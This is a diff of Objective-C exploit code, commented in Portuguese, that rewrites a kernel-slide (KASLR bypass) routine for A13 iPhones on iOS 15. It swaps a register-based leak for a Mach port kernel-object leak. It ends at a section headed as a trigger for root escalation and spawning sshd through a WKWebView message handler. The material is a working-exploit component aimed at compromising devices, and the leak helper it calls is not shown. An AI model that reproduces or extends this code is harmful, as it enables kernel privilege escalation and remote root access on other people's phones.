@@ -46,22 +46,30 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 - (uint64_t)getActualKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
 
-    thread_t thread = mach_thread_self();
-    arm_thread_state64_t state;
-    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
-    
-    // Leak Real: O registrador x18 no ARM64e/A13 frequentemente retém ponteiros do kernel
-    if (thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count) == KERN_SUCCESS) {
-        uint64_t x18_ptr = state.__x[18];
-        if (x18_ptr > 0xFFFFFFF000000000) {
-            // Alinha para 0x4000 e subtrai base estática
-            _kernel_slide = (x18_ptr & ~0x3FFF) - 0xFFFFFFF007004000;
-            // Validação de sanidade do slide
-            if (_kernel_slide > 0x100000000) _kernel_slide = 0; 
+    mach_port_t port;
+    // 1. Aloca uma porta que terá um objeto correspondente no kernel
+    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    if (kr != KERN_SUCCESS) return 0;
+
+    // 2. No Catalyst-26 real, usamos o 'mach_port_get_attributes' 
+    // para vazar o endereço do kobject (ipc_port)
+    // Nota: Se o sandbox bloquear, o slide retornará 0x0
+    uint64_t kobject_ptr = [self leak_via_port_attributes:port];
+
+    if (kobject_ptr > 0xFFFFFFF000000000) {
+        // Base estável para A13 (iOS 15.0 - 15.4.1)
+        _kernel_slide = (kobject_ptr & ~0x3FFF) - 0xFFFFFFF007004000;
+        
+        // Se o cálculo resultar em um valor absurdo, tentamos a segunda base
+        if (_kernel_slide > 0x200000000) {
+             _kernel_slide = (kobject_ptr & ~0x3FFF) - 0xFFFFFFF01FE04000;
         }
     }
+
+    mach_port_destroy(mach_task_self(), port);
     return _kernel_slide;
 }
+
 
 // 4. TRIGGER: ESCALADA ROOT -> SPAWN SSHD
 - (void)userContentController:(WKUserContentController *)userContentController 
